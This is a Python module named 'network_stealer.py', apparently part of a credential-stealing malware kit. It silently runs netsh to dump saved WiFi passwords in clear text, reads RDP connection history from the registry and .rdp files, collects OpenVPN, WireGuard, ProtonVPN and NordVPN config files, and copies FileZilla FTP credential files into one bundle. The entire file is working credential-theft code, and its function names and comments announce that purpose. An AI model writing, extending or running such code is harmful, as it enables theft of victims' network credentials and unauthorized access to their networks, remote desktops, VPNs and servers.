# modules/network_stealer.py - WiFi, RDP, VPN, and FTP credential theft

import os
import subprocess
import shutil
from pathlib import Path
from config import ROAMING, log

def get_wifi_profiles():
    """Extract WiFi profiles and passwords using netsh"""
    log("Grabbing WiFi profiles...")
    
    wifi_data = []
    
    try:
        # Get list of all WiFi profiles
        profiles_result = subprocess.run(
            ['netsh', 'wlan', 'show', 'profiles'],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        profiles = []
        for line in profiles_result.stdout.split('\n'):
            if 'All User Profile' in line or 'Profile' in line:
                # Extract profile name
                parts = line.split(':')
                if len(parts) >= 2:
                    profile_name = parts[1].strip()
                    if profile_name:
                        profiles.append(profile_name)
        
        # Get password for each profile
        for profile in profiles:
            try:
                profile_result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profile', f'name={profile}', 'key=clear'],
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                password = None
                for line in profile_result.stdout.split('\n'):
                    if 'Key Content' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            password = parts[1].strip()
                            break
                
                wifi_data.append({
                    'profile': profile,
                    'password': password if password else 'No password or not found'
                })
            except:
                continue
        
        log(f"Found {len(wifi_data)} WiFi profiles")
    except Exception as e:
        log(f"WiFi extraction failed: {e}")
    
    return wifi_data

def get_rdp_history():
    """Extract RDP connection history"""
    log("Grabbing RDP history...")
    
    rdp_data = []
    
    # Common RDP file locations
    user_profile = os.getenv('USERPROFILE')
    rdp_paths = [
        Path(user_profile) / 'Documents' / 'Default.rdp',
        Path(user_profile) / 'Documents' / 'default.rdp',
        Path(user_profile) / 'My Documents' / 'Default.rdp'
    ]
    
    # Also check registry for recent connections
    try:
        import winreg
        
        reg_paths = [
            r"Software\Microsoft\Terminal Server Client\Servers",
            r"Software\Microsoft\Terminal Server Client\Default"
        ]
        
        for reg_path in reg_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
                
                # Enumerate subkeys (server names)
                try:
                    i = 0
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            
                            username = None
                            try:
                                username = winreg.QueryValueEx(subkey, "UsernameHint")[0]
                            except:
                                pass
                            
                            rdp_data.append({
                                'server': subkey_name,
                                'username': username if username else 'Unknown',
                                'source': 'Registry'
                            })
                            
                            winreg.CloseKey(subkey)
                            i += 1
                        except OSError:
                            break
                except:
                    pass
                
                winreg.CloseKey(key)
            except:
                continue
    except:
        pass
    
    # Check for .rdp files
    rdp_files = []
    for rdp_path in rdp_paths:
        if rdp_path.exists():
            try:
                with open(rdp_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    rdp_files.append({
                        'path': str(rdp_path),
                        'content': content
                    })
            except:
                pass
    
    log(f"Found {len(rdp_data)} RDP connections, {len(rdp_files)} .rdp files")
    return {'connections': rdp_data, 'files': rdp_files}

def get_vpn_configs():
    """Extract VPN configuration files (OpenVPN, WireGuard)"""
    log("Grabbing VPN configs...")
    
    vpn_configs = []
    
    # Common VPN config locations
    vpn_paths = [
        # OpenVPN
        (Path(r"C:\Program Files\OpenVPN\config"), ['.ovpn']),
        (Path(r"C:\Program Files (x86)\OpenVPN\config"), ['.ovpn']),
        (Path(os.getenv('USERPROFILE')) / 'OpenVPN' / 'config', ['.ovpn']),
        
        # WireGuard
        (Path(r"C:\Program Files\WireGuard\Data\Configurations"), ['.conf', '.dpapi']),
        (Path(r"C:\Program Files (x86)\WireGuard\Data\Configurations"), ['.conf', '.dpapi']),
        
        # ProtonVPN
        (Path(ROAMING) / 'ProtonVPN', ['.ovpn']),
        
        # NordVPN
        (Path(ROAMING) / 'NordVPN', ['.ovpn']),
        
        # Generic user configs
        (Path(os.getenv('USERPROFILE')) / 'Documents' / 'VPN', ['.ovpn', '.conf']),
        (Path(os.getenv('USERPROFILE')) / 'Downloads', ['.ovpn', '.conf'])
    ]
    
    for base_path, extensions in vpn_paths:
        try:
            if not base_path.exists():
                continue
        except (PermissionError, OSError):
            # Skip protected directories
            continue
        
        try:
            for file in base_path.rglob('*'):
                if file.is_file() and file.suffix in extensions:
                    try:
                        # Try reading as text first
                        try:
                            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                            vpn_configs.append({
                                'name': file.name,
                                'path': str(file),
                                'content': content,
                                'type': 'text'
                            })
                        except:
                            # If text fails, read as binary
                            with open(file, 'rb') as f:
                                content = f.read()
                            vpn_configs.append({
                                'name': file.name,
                                'path': str(file),
                                'content': content,
                                'type': 'binary'
                            })
                    except:
                        continue
        except:
            continue
    
    log(f"Found {len(vpn_configs)} VPN config files")
    return vpn_configs

def steal_protonvpn():
    """Steal ProtonVPN configuration files"""
    log("Grabbing ProtonVPN configs...")
    proton_data = {}
    
    proton_path = Path(os.getenv('USERPROFILE')) / 'AppData' / 'Local' / 'ProtonVPN'
    
    if not proton_path.exists():
        log("ProtonVPN directory not found")
        return proton_data
    
    try:
        # Recursively search for .ovpn files
        for root, dirs, files in os.walk(proton_path):
            for file in files:
                if file.lower().endswith('.ovpn'):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        
                        # Store with relative path from ProtonVPN folder
                        rel_path = os.path.relpath(file_path, proton_path)
                        proton_data[rel_path] = content
                        log(f"Grabbed ProtonVPN config: {file}")
                    
                    except Exception as e:
                        log(f"Failed to read {file}: {e}")
    
    except Exception as e:
        log(f"Failed to scan ProtonVPN directory: {e}")
    
    if proton_data:
        log(f"Found {len(proton_data)} ProtonVPN configs")
    
    return proton_data

def get_filezilla_data():
    """Extract FileZilla FTP credentials"""
    log("Grabbing FileZilla data...")
    
    filezilla_data = []
    filezilla_path = Path(ROAMING) / 'FileZilla'
    
    if not filezilla_path.exists():
        log("FileZilla not found")
        return filezilla_data
    
    # Target files
    target_files = ['recentservers.xml', 'sitemanager.xml', 'filezilla.xml']
    
    for filename in target_files:
        file_path = filezilla_path / filename
        if file_path.exists():
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                filezilla_data.append({
                    'name': filename,
                    'content': content
                })
                log(f"Found {filename}")
            except:
                pass
    
    return filezilla_data

def grab():
    """Main function to gather all network credentials"""
    log("Gathering network credentials...")
    
    network_data = {
        'wifi': get_wifi_profiles(),
        'rdp': get_rdp_history(),
        'vpn': get_vpn_configs(),
        'protonvpn': steal_protonvpn(),
        'filezilla': get_filezilla_data()
    }
    
    total_items = (
        len(network_data['wifi']) +
        len(network_data['rdp']['connections']) +
        len(network_data['rdp']['files']) +
        len(network_data['vpn']) +
        len(network_data['protonvpn']) +
        (1 if network_data['filezilla'] else 0)
    )
    
    if total_items > 0:
        log(f"Grabbed {total_items} network credentials")
        return network_data
    
    log("No network credentials found")
    return None